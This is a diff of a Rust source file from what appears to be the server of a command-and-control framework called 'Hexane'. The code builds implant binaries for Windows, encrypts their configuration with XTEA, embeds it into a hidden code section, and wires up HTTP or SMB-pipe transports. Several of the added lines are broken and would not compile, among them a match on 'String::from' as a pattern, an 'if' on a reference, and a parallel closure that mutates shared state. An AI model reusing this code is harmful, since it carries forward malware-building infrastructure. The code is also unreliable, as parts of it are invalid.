@@ -6,16 +6,17 @@ use std::collections::HashMap;
 use std::path::Path;
 use std::sync::{Arc, Mutex};
 use std::sync::mpsc::channel;
+
 use rayon::iter::IntoParallelRefIterator;
 use crate::server::INSTANCES;
-use crate::server::session::{CURDIR, SESSION, USERAGENT};
-use crate::server::types::{NetworkType, InjectionOptions, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
+use crate::server::session::{CURDIR, SESSION};
+use crate::server::types::{NetworkType, NetworkOptions, Config, Compiler, Network, Builder, Loader, UserSession, JsonData, BuildType};
+use crate::server::utils::{generate_hashes, run_command, wrap_message};
 use crate::server::cipher::{crypt_create_key, crypt_xtea};
+use crate::server::binary::embed_section_data;
 use crate::server::error::{Error, Result};
-use crate::server::utils::{generate_hashes, wrap_message};
 use crate::server::stream::Stream;
 use crate::{return_error, length_check_defer};
-use crate::server::builder::{generate_definitions, CompileTarget};
 
 pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
@@ -31,8 +32,12 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
     instance.user_session.username = session.username.clone();
     instance.user_session.is_admin = session.is_admin.clone();
 
-    if instance.network_type != NetworkType::Http as u8 {
-        instance.setup_listener()?;
+    if let Some(network) = &instance.network {
+        match network.r#type {
+
+            NetworkType::Http => instance.setup_listener()?,
+            _ => { }
+        }
     }
 
     wrap_message("info", &format!("{} is ready", instance.builder.output_name));
@@ -44,13 +49,13 @@ pub(crate) fn load_instance(args: Vec<String>) -> Result<()> {
 
 pub(crate) fn remove_instance(args: Vec<String>) -> Result<()> {
     length_check_defer!(args, 3);
+    // todo: remove from db
 
-    let mut instances = INSTANCES.lock().map_err(|e| e.to_string())?;
-    if let Some(pos) = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
+    let mut instances   = INSTANCES.lock().map_err(|e| e.to_string())?;
+    if let Some(pos)    = instances.iter().position(|instance| instance.builder.output_name == args[2]) {
 
         wrap_message("info", &format!("{} removed", instances[pos].builder.output_name));
         instances.remove(pos);
-        // todo: remove from db
 
         Ok(())
     }
@@ -127,11 +132,11 @@ impl Hexane {
         fs::create_dir(&self.compiler.build_directory)?;
 
         wrap_message("debug", &"generating config data".to_owned());
-        self.generate_config_bytes()?;
+        &self.generate_config_bytes()?;
 
         wrap_message("debug", &"generating string hashes".to_owned());
         generate_hashes(strings_file, hash_file)?;
-        generate_definitions(self.definitions);
+        generate_definitions(&self.compiler.definitions);
 
         wrap_message("debug", &"building sources".to_owned());
 
@@ -147,12 +152,12 @@ impl Hexane {
     }
 
     fn generate_config_bytes(&mut self) -> Result<()> {
-        self.crypt_key = crypt_create_key(16);
-        let mut patch = self.create_binary_patch()?;
+        self.crypt_key  = crypt_create_key(16);
+        let mut patch   = self.create_binary_patch()?;
 
         if self.main.encrypt {
-            let patch_cpy = patch.clone();
-            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
+            let patch_cpy   = patch.clone();
+            patch           = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
         }
 
         self.config_data = patch;
@@ -161,23 +166,6 @@ impl Hexane {
 
     fn create_binary_patch(&mut self) -> Result<Vec<u8>> {
         let mut stream = Stream::new();
-
-        if self.network_type == NetworkType::Http as u8 {
-            stream.pack_byte(NetworkType::Http as u8);
-        }
-        else if self.network_type == NetworkType::Smb as u8 {
-            stream.pack_byte(NetworkType::Smb as u8);
-        }
-        else {
-            return_error!("invalid network type")
-        }
-
-        if self.main.architecture == "amd64" {
-            stream.pack_dword(1);
-        }
-        else {
-            stream.pack_dword(0);
-        }
 
         if let Some(modules) = &self.builder.loaded_modules {
             for module in modules {
@@ -249,5 +237,128 @@ impl Hexane {
 
         Ok(stream.buffer)
     }
+
+    fn compile_object(&mut self, flags: Vec<String>) -> Result<()> {
+        let mut defs: HashMap<String, Vec<u8>> = HashMap::new();
+
+        if self.compiler.command != "ld" && self.compiler.command != "nasm" {
+            if &self.main.debug {
+                defs.insert("DEBUG".to_string(), vec![]);
+            }
+
+            match &self.main.architecture {
+                String::from("amd64")   => defs.insert("BSWAP".to_string(), vec![0]),
+                _                       => defs.insert("BSWAP".to_string(), vec![1]),
+            }
+
+            if let Some(network) = &self.network {
+                match network.r#type {
+                    NetworkType::Http   => defs.insert("TRANSPORT_HTTP".to_string(), vec![]),
+                    NetworkType::Smb    => defs.insert("TRANSPORT_PIPE".to_string(), vec![]),
+                }
+            }
+        }
+
+        if !self.compiler.components.is_empty() {
+            self.compiler.command += &generate_arguments(self.compiler.components.clone());
+        }
+        if !flags.is_empty() {
+            self.compiler.command += &generate_definitions(&defs);
+        }
+
+        for (k, v) in &defs {
+            self.compiler.command += &generate_definitions(&HashMap::from([(k.clone(), v.clone())]));
+        }
+
+        self.compiler.command += &format!(" -o {} ", self.builder.output_name);
+
+        run_command(&self.compiler.command, &self.peer_id.to_string())?;
+        embed_section_data(&self.builder.output_name, ".text$F", &self.config_data.as_slice())?;
+
+        Ok(())
+    }
+
+    pub fn compile_sources(&mut self) -> Result<()> {
+        let src_path        = Path::new(&self.builder.root_directory).join("src");
+        let entries: Vec<_> = fs::read_dir(src_path)?.filter_map(|entry| entry.ok()).collect();
+
+        let (err_send, err_recv)    = channel();
+        let atoms                   = Arc::new(Mutex::new(()));
+
+        entries.par_iter().for_each(|src| {
+            if !src.metadata().map_or(false, |map| map.is_file()) {
+                return;
+            }
+
+            let path    = src.path();
+            let output  = Path::new(&env::current_dir().unwrap().join("build")).join(self.builder.output_name.clone()).with_extension("o");
+
+            let atoms_clone = Arc::clone(&atoms);
+            let err_clone   = err_send.clone();
+
+            let result = {
+                let _guard = atoms_clone.lock().unwrap();
+                match path.extension().and_then(|ext| ext.to_str()) {
+
+                    Some("asm") => {
+                        self.compiler.command   = "nasm".to_owned();
+                        let flags               = vec!["-f win64".to_string()];
+
+                        wrap_message("debug", &format!("compiling {}", &output.display()));
+                        self.compile_object(flags)?;
+                    }
+
+                    Some("cpp") => {
+                        self.compiler.command   = "x86_64-w64-mingw32-g++".to_owned();
+                        let mut flags           = vec![self.compiler.compiler_flags.clone()];
+
+                        flags.push("-c".parse().unwrap());
+
+                        wrap_message("debug", &format!("compiling {}", &output.display()));
+                        self.compile_object(flags)?;
+                    }
+                    _ => { },
+                }
+            };
+
+            match result {
+                Ok(_)   => self.components.push(output.to_str().unwrap().to_string()),
+                Err(e)  => err_clone.send(e).unwrap(),
+            }
+        });
+
+        if let Ok(err) = err_recv.try_recv() {
+            return_error!("{}", err);
+        }
+
+        // todo: link all objects
+
+        Ok(())
+    }
 }
 
+pub fn generate_includes(includes: Vec<String>) -> String {
+    wrap_message("debug", &"including directories".to_owned());
+    includes.iter().map(|inc| format!(" -I{} ", inc)).collect::<Vec<_>>().join("")
+}
+
+pub fn generate_arguments(args: Vec<String>) -> String {
+    wrap_message("debug", &"generating arguments".to_owned());
+    args.iter().map(|arg| format!(" {} ", arg)).collect::<Vec<_>>().join("")
+}
+
+pub fn generate_definitions(definitions: &HashMap<String, Vec<u8>>) -> String {
+    let mut defs    = String::new();
+
+    wrap_message("debug", &"generating defintions".to_owned());
+
+    for (name, def) in definitions {
+        if def.is_empty() {
+            defs.push_str(&format!(" -D{} ", name));
+        } else {
+            defs.push_str(&format!(" -D{}={:?} ", name, def));
+        }
+    }
+
+    defs
+}
